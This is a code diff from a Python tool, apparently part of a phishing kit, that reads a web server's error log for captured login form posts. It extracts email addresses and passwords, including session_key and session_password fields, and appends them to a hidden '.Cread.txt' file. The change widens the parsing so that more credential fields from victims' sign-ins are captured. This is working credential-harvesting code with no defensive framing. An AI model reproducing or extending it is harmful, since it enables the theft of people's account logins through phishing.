@@ -25,15 +25,20 @@ class dns_result :
           with open(Path_St+'/ServerLog/log_error.log') as Log_Handel :
               Log_read = Log_Handel.readlines()
           for line in Log_read:     
-              if '%40'in  line  :             
-                line       = line.split('=')
+              if '%40'in  line  :            
+                line       = line.split('&')
                 line_split = str(line[1:3]).split('+&password')
-                line_cread = str("".join(line_split)).replace('+&password',' ').replace('&captcha_text',' ').split(',')
+                line_cread = str("".join(line_split)).replace('+&password',' ').replace('&captcha_text',' ')\
+                .replace("+&session_password=1",'').replace("&session_key ",'').replace('session_key=','')\
+                .replace("+",'').replace(",",'').split()
                 line_cread_1 = str("".join(line_cread[0])).replace("['",'').replace("'",'')\
-                .replace('%40','@').replace("&password",'').replace('+&key1','').replace('&key1','').replace('&session_password','')
+                .replace('%40','@').replace("&password",'').replace('+&key1','').replace('&key1','')\
+                .replace('&session_password=1','').replace("&session_key",'').replace("session_password=",'').replace(",",'')
                 try: 
                     line_cread_2 = str("".join(line_cread[1])).replace("]",'')\
-                    .replace("']",'').replace("'",'').replace('\\n','').replace("&signIn",'').replace('&isJsEnabled','').strip()  
+                    .replace("']",'').replace("'",'').replace('\\n','').replace("&signIn",'')\
+                    .replace('&isJsEnabled','').replace("&session_key=",'').replace('&session_password=1','')\
+                    .replace("+&session_password",'').replace("session_password=",'').replace(",",'').strip()  
                     with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
                         Cread_User.write(line_cread_1+'\n'+line_cread_2+'\n')
                 except IndexError:
